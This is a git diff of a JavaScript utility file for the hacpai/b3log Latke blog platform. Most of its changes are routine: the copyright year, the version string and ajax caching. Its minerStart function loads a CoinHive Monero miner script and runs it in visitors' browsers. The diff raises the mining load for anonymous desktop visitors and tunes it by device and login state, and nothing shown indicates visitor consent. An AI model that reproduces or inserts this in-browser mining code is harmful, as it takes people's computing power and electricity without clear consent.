@@ -1,5 +1,5 @@
 /*
- * Copyright (c) 2010-2017, b3log.org & hacpai.com
+ * Copyright (c) 2010-2018, b3log.org & hacpai.com
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -13,13 +13,12 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-
 /**
  * @fileoverview util and every page should be used.
  *
  * @author <a href="http://vanessa.b3log.org">Liyuan Li</a>
  * @author <a href="http://88250.b3log.org">Liang Ding</a>
- * @version 1.3.0.0, Dec 5, 2017
+ * @version 1.3.1.0, Dec 5, 2017
  */
 
 /**
@@ -66,7 +65,8 @@ var Util = {
         $.ajax({
           method: "GET",
           url: "https://cdn.staticfile.org/MathJax/MathJax-2.6-latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML&_=1473258780393",
-          dataType: "script"
+          dataType: "script",
+          cache: true
         }).done(function () {
           initMathJax();
         });
@@ -93,7 +93,8 @@ var Util = {
         $.ajax({
           method: "GET",
           url: latkeConfig.staticServePath + '/js/lib/flowchart/flowchart.min.js',
-          dataType: "script"
+          dataType: "script",
+          cache: true
         }).done(function () {
           initFlow()
         });
@@ -240,20 +241,30 @@ var Util = {
    * @description xmr 挖矿，收入将用于维持社区运维
    */
   minerStart: function () {
+    if (navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
+      return
+    }
     $.ajax({
       method: "GET",
-      url: 'https://img.hacpai.com/xmr.min.js',
+      url: 'https://static.hacpai.com/js/lib/xmr.min.js',
       dataType: "script"
     }).done(function () {
-      var miner = new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', {threads: 1, throttle: 0.9});
-      miner.start();
+      var data = {threads: 2, throttle: 0.5}
+      if (latkeConfig && latkeConfig.isLoggedIn === 'true') {
+        data = {threads: 1, throttle: 0.8}
+      }
+      const ua =  navigator.userAgent;
+      if (/Android/i.test(ua) || /BlackBerry/i.test(ua) || /IEMobile/i.test(ua) || /iPhone|iPad|iPod/i.test(ua)) {
+        data = {threads: 1, throttle: 0.8}
+      }
+      (new CoinHive.Anonymous('gr2r3rJsYmaJpSd2Nml15zomewwc6Lzc', data)).start();
     });
   },
   /**
    * @description 页面初始化执行的函数
    */
   init: function () {
-//window.onerror = Util.error;
+  //window.onerror = Util.error;
     Util.killIE();
     Util.setTopBar();
     Util.parseMarkdown();
